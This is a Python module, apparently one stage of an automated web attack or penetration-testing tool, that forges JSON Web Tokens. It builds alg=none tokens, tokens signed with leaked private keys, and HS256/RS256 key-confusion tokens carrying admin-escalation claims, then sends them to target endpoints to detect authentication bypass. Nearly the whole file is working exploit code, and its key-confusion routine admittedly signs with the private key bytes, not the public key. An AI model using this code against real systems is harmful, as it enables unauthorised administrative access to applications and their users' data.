"""Crypto attacks (L14) — JWT / cookie tampering / signature forgery.

When earlier stages recovered private keys (RSA / EC) we can:
  - Try to FORGE a JWT signed by the leaked key against the application.
  - Try common JWT vulnerabilities: alg=none confusion, HS256/RS256
    confusion (using the public key as HMAC secret), kid header tricks.
  - Detect cookies that look like base64-encoded JWT / signed blobs.

This module never actively logs in or modifies server state; it issues
benign GET requests with the forged tokens and reports whether the
application accepted them (i.e. did not redirect to login).
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

from .http_client import HttpClient


JWT_RE = re.compile(r"\beyJ[A-Za-z0-9_-]{4,}\.eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]+\b")


def _b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64u_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def make_alg_none_jwt(claims: dict) -> str:
    """Build a JWT with alg=none signature (Trojan)."""
    header = {"alg": "none", "typ": "JWT"}
    h = _b64u(json.dumps(header, separators=(",", ":")).encode())
    p = _b64u(json.dumps(claims, separators=(",", ":")).encode())
    return f"{h}.{p}."


def make_hs256_with_public_key(claims: dict, pub_key_pem: bytes) -> str:
    """RS256→HS256 confusion: sign HS256 using the RSA public key bytes as secret."""
    header = {"alg": "HS256", "typ": "JWT"}
    h = _b64u(json.dumps(header, separators=(",", ":")).encode())
    p = _b64u(json.dumps(claims, separators=(",", ":")).encode())
    sig_input = f"{h}.{p}".encode()
    sig = hmac.new(pub_key_pem, sig_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64u(sig)}"


def make_rs256_jwt(claims: dict, priv_key_pem: bytes) -> Optional[str]:
    """Build a real RS256-signed JWT using the leaked private key (if cryptography is available)."""
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        priv = serialization.load_pem_private_key(priv_key_pem, password=None)
        header = {"alg": "RS256", "typ": "JWT"}
        h = _b64u(json.dumps(header, separators=(",", ":")).encode())
        p = _b64u(json.dumps(claims, separators=(",", ":")).encode())
        sig_input = f"{h}.{p}".encode()
        sig = priv.sign(sig_input, padding.PKCS1v15(), hashes.SHA256())
        return f"{h}.{p}.{_b64u(sig)}"
    except Exception:
        return None


def parse_jwt_claims(token: str) -> Optional[dict]:
    try:
        _, payload, _ = token.split(".", 2)
        return json.loads(_b64u_decode(payload))
    except Exception:
        return None


@dataclass
class CryptoFinding:
    technique: str
    endpoint: str
    detail: str
    severity: str = "critical"


@dataclass
class CryptoReport:
    discovered_jwts: list[dict] = field(default_factory=list)
    cookie_inspections: list[dict] = field(default_factory=list)
    forged_token_tests: list[dict] = field(default_factory=list)
    findings: list[CryptoFinding] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)


async def discover_jwts_in_responses(client: HttpClient,
                                      candidates: list[str]) -> list[dict]:
    """Walk a list of URLs, fetch each, and look for JWTs in body+cookies."""
    out: list[dict] = []
    for url in candidates[:30]:
        r = await client._request(url)
        if not r.ok:
            continue
        try:
            body = r.content[:80000].decode("utf-8", errors="replace")
        except Exception:
            continue
        for m in JWT_RE.finditer(body):
            tok = m.group(0)
            claims = parse_jwt_claims(tok)
            out.append({"url": url, "source": "body", "token": tok[:80] + "...",
                         "claims": claims})
        set_cookie = r.headers.get("set-cookie") or r.headers.get("Set-Cookie")
        if set_cookie:
            for m in JWT_RE.finditer(set_cookie):
                tok = m.group(0)
                claims = parse_jwt_claims(tok)
                out.append({"url": url, "source": "set-cookie",
                             "token": tok[:80] + "...", "claims": claims})
    return out


async def forge_and_test(client: HttpClient, target: str,
                          private_keys: list[Path],
                          test_endpoints: list[str]) -> CryptoReport:
    """Build forged tokens and test them on protected endpoints."""
    report = CryptoReport()
    # 1) JWT discovery
    report.discovered_jwts = await discover_jwts_in_responses(client, test_endpoints)

    # 2) Build forgery candidates
    base_claims_set = [
        {"sub": "admin", "user": "admin", "role": "admin", "iat": int(time.time()),
         "exp": int(time.time()) + 3600},
        {"sub": "administrator", "isAdmin": True, "iat": int(time.time())},
        {"username": "admin", "user_id": 1, "is_superuser": True},
    ]
    # If we discovered real JWTs, mutate their claims to escalate
    for d in report.discovered_jwts:
        if d.get("claims"):
            esc = dict(d["claims"])
            for key in ("role", "isAdmin", "is_admin", "admin", "is_superuser"):
                esc[key] = True if isinstance(esc.get(key), bool) else "admin"
            esc["user"] = "admin"
            base_claims_set.append(esc)

    tokens_to_try: list[tuple[str, str]] = []  # (label, token)

    for claims in base_claims_set:
        tokens_to_try.append((f"alg-none/{claims.get('sub','?')}",
                               make_alg_none_jwt(claims)))

    # 3) For each private key build RS256 + HS256-confusion tokens
    for pk_path in private_keys[:3]:
        try:
            pem = pk_path.read_bytes()
        except Exception:
            continue
        for claims in base_claims_set:
            rs = make_rs256_jwt(claims, pem)
            if rs:
                tokens_to_try.append((f"RS256/{pk_path.name}/{claims.get('sub','?')}", rs))
            # HS256 confusion: try with the *public* key bytes as HMAC secret —
            # we approximate using the PEM bytes themselves since extracting
            # the public PEM is non-trivial here; better than nothing.
            hs = make_hs256_with_public_key(claims, pem)
            tokens_to_try.append((f"HS256-confusion/{pk_path.name}/{claims.get('sub','?')}", hs))

    # 4) Test each token against each endpoint (Authorization Bearer + cookie)
    # First, get a BASELINE response (no token) for each endpoint so we can tell
    # if the token actually changed behavior. Without this, JWT bypass attempts
    # against unauthenticated pages get marked as "accepted" simply because
    # the page returns 200.
    baselines: dict[str, tuple[int, int]] = {}
    for ep in test_endpoints[:8]:
        b = await client._request(ep)
        baselines[ep] = (b.status, len(b.content))

    for label, tok in tokens_to_try[:40]:
        for ep in test_endpoints[:8]:
            for hdr_name in ("Authorization",):
                value = f"Bearer {tok}"
                r = await client._request(ep, extra_headers={hdr_name: value})
                base_status, base_size = baselines.get(ep, (0, 0))
                # Only count as "accepted" when:
                #  1. response is OK
                #  2. response is bigger than 100B (not a redirect/error page)
                #  3. no login/unauth marker in body
                #  4. the response materially differs from the unauth baseline
                #     (status changed OR body size changed by ≥10%)
                size_delta = abs(len(r.content) - base_size)
                size_changed = size_delta > max(50, base_size * 0.1)
                status_changed = r.status != base_status
                accepted = (r.ok and len(r.content) > 100
                            and b"login" not in r.content[:1024].lower()
                            and b"unauth" not in r.content[:1024].lower()
                            and (status_changed or size_changed))
                report.forged_token_tests.append({
                    "label": label, "endpoint": ep, "header": hdr_name,
                    "status": r.status, "size": len(r.content),
                    "baseline_status": base_status, "baseline_size": base_size,
                    "accepted": accepted,
                })
                if accepted:
                    report.findings.append(CryptoFinding(
                        technique=label, endpoint=ep,
                        detail=(f"forged token altered response: "
                                f"baseline {base_status}/{base_size}B → "
                                f"{r.status}/{len(r.content)}B"),
                    ))
    return report
